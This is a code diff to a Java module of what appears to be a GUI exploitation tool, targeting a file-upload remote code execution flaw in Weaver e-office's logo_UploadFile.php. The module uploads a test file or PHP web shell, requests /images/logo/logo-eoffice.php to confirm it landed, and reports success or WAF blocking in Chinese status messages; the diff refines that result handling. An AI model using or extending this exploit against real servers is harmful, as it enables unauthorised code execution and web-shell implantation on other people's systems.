@@ -12,12 +12,20 @@ public class weaveroa_office_UploadFile implements Exploitlnterface {
     @Override
     public Boolean checkVul(String url, TextArea textArea) {
         Boolean att = att(url,shell.Testpath,textArea);
+        if(att == null){
+            textArea.appendText("\n e-office logo_UploadFile.php-RCE - 漏洞不存在 (出现误报请联系作者)");
+            return false;
+        }
         return att;
     }
 
     @Override
     public Boolean getshell(String url, TextArea textArea) {
         Boolean att = att(url, shell.Phppath, textArea);
+        if(att == null){
+            textArea.appendText("\n 漏洞存在 被WAF拦截 请手动复现");
+            return true;
+        }
         return att;
     }
 
@@ -36,14 +44,11 @@ public class weaveroa_office_UploadFile implements Exploitlnterface {
 
         if(post.getCode() == 200 && post.getText().contains("logo-eoffice.php")){
             Response response = HttpTools.get(url + "/images/logo/logo-eoffice.php", new HashMap<String, String>(), "utf-8");
-            System.out.println("到这了");
-            System.out.println(response.getText());
-            if(response.getText().contains(shell.test_payload)){
+            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                 textArea.appendText("\n 漏洞存在 测试文件写入成功 \n "+ url + "/images/logo/logo-eoffice.php");
                 return true;
             }else {
-                textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
-                return false;
+                return null;
             }
 
         }else {
